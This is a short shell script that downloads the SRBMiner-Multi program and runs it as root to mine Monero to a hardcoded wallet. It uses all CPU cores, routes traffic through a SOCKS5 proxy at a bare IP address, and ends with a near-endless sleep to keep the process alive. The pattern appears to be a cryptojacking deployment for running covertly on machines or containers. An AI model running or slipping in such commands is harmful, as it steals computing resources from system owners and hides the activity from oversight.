#mineng
apt update && apt upgrade
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.1/SRBMiner-Multi-0-7-1-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-7-1-Linux.tar.xz && cd SRBMiner-Multi-0-7-1 && sudo ./SRBMiner-MULTI --algorithm randomx --pool us.monero.herominers.com:1111 --wallet 8A2dMrR8WtpPJWCMYu1cUGa1HZvL3ixhiGpCEb9ncX3KBYz9DKsY9FN65GVGCaSjrEXhgPZoaz6MZ7NPGWoQ915wKLVsnGx.$worker -t $(nproc --all) --proxy socks5://47.243.184.125:1537
sleep 9999999999999
